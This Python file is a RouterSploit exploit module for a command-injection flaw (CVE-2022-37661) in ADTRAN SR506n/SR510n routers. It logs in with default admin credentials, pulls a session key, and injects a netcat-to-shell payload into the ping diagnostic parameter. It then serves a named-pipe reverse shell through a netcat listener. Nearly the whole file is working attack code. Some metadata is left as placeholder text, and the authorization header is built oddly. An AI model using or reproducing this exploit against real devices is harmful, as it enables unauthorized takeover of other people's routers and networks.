from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    http_request,
    mute,
)
from subprocess import Popen, PIPE


class Exploit(exploits.Exploit):
    __info__ = {
        "name": "Router Remote Code Execution",
        "description": "Exploit description...",
        "authors": (
            "Author Name", # Yerodin Richards
        ),
        "references": (
            "Reference link", # https://www.exploit-db.com/exploits/51031
        ),
        "devices": (
            "Vendor:Model:Version",# Vendor Homepage: https://adtran.com # Version: 2.5.15 / 2.6.13 (confirmed)
                                  # Tested on: SR506n (2.5.15) & SR510n (2.6.13)
                                  # CVE : CVE-2022-37661
        ),
    }

    target = exploits.Option("", "Target IP address", required=True)
    username = exploits.Option("admin", "Username for authentication", required=True)
    password = exploits.Option("admin", "Password for authentication", required=True)
    lhost = exploits.Option("lo", "Local Host")
    lport = exploits.Option(80, "Local Port")
    payload_port = exploits.Option(81, "Payload Port")

    def execute_command(self, cmd):
        try:
            e_proc = Popen(["echo", f"{cmd}"], stdout=PIPE)
            nc_proc = Popen(["nc", "-nlvp", f"{self.payload_port}"], stdin=e_proc.stdout)
            e_proc.communicate()
            nc_proc.communicate()
        except Exception as e:
            print_error(f"Error: {str(e)}")

    def get_session(self):
        url = f"http://{self.target}/admin/ping.html"
        headers = {"Authorization": f"Basic {self.username}:{self.password}"}
        response = http_request(method="GET", url=url, headers=headers)
        if response is None:
            return None
        session_key_start = response.text.find("&sessionKey=") + len("&sessionKey=")
        session_key_end = response.text.find("'", session_key_start)
        return response.text[session_key_start:session_key_end]

    def run(self):
        session_key = self.get_session()
        if session_key:
            print_success("Session key obtained successfully!")
            payload = f"|nc {self.lhost} {self.payload_port}|sh"
            url = f"http://{self.target}/admin/pingHost.cmd"
            headers = {"Authorization": f"Basic {self.username}:{self.password}"}
            params = {
                "action": "add",
                "targetHostAddress": payload,
                "sessionKey": session_key,
            }
            response = http_request(method="GET", url=url, headers=headers, params=params)
            if response is not None:
                print_success("Payload sent successfully!")
                print_status("Waiting for the shell...")
                self.execute_command(f"rm /tmp/s && mknod /tmp/s p && /bin/sh 0< /tmp/s | nc {self.lhost} {self.lport} > /tmp/s")
            else:
                print_error("Failed to send payload.")
        else:
            print_error("Failed to obtain session key.")


